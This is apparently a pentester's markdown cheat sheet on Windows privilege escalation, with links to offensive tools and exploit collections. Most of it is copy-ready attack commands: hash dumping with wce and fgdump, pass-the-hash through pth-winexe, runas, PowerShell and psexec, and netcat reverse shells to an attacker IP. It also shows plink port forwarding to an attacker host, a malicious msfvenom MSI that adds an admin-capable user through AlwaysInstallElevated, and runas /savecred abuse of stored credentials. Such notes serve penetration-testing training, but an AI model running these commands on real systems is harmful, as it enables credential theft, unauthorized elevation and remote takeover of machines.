# Windows Priv escalation
Lots of this is just how good you can get at enumerating, go look at the Windows section under Enumeration/systems/windows.

## Kerberos
https://github.com/rasta-mouse/Rubeus


lateral movement after expl
https://github.com/rasta-mouse/MiscTools


## Links
https://github.com/Tib3rius/Pentest-Cheatsheets/tree/master/privilege-escalation/windows
https://www.fuzzysecurity.com/tutorials/16.html
https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
https://github.com/AonCyberLabs/Windows-Exploit-Suggester <-idk how well this works anymore

## try this first
```
wmic qfe get Caption,Description,HotFixID,InstalledOn

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```


## Missing patches?
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/windows/missing-patch-exploits.rst

## Passing the Hash
The following commands can be used to dump password hashes:
```
wce32.exe -w
wce64.exe -w
fgdump.exe
```
### Remote
Pass the hash remotely to gain a shell:
```
pth-winexe -U <domain>/<username>%<hash> //<target-ip> cmd
```
Sometimes you may need to reference the target by its hostname (add an entry to /etc/hosts to make it resolve):
```
pth-winexe -U <domain>/<username>%<hash> //<target-hostname> cmd
```
Alternative:
```
export SMBHASH=<hash>
pth-winexe -U <domain>/<username>% //<target-ip> cmd
```
### Local
Pass the hash locally using runas:
```
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <hash> "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```
Pass the hash locally using PowerShell:
```
secpasswd = ConvertTo-SecureString "<hash>" -AsPlainText -Force
mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\Windows\Temp\nc.exe","<attacker-ip> 53 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```
Pass the hash locally using psexec:
```
psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
```
## Loopback Services
Search for services listening on the loopback interface:
```
netstat -ano | findstr "LISTEN"
```
Use plink.exe to forward the loopback port to a port on our attacking host (via SSH):
```
plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>
```
## AlwaysInstallElevated
AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

Both the following registry values must be set to "1" for this to work:
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Create a malicious MSI:
```
msfvenom -p windows/adduser USER=pwned PASS=P@ssw0rd -f msi -o evil.msi
```
Use msiexec to run the malicious MSI:
```
msiexec /quiet /qn /i C:\evil.msi
```
## Stored Credentials
If there are stored credentials, we can run commands as that user:
```
$ cmdkey /list

Currently stored credentials:

Target: Domain:interactive=PWNED\Administrator
Type: Domain Password
User: PWNED\Administrator
```
Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:
```
runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"
```